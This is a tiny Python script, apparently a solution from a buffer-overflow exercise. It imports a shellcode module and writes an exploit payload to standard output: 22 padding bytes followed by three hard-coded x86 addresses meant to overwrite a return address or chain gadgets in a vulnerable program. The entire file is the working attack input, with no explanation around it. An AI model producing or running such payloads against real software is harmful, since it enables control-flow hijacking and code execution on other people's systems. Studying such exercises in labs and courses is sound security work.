import sys
from shellcode import shellcode

# Send bytes to output
data = b"A"*22 + b"\xd0\x14\x05\x08" + b"\xb0\x06\x05\x08" +  b"\x4d\x88\x0b\x08"
sys.stdout.buffer.write(data)

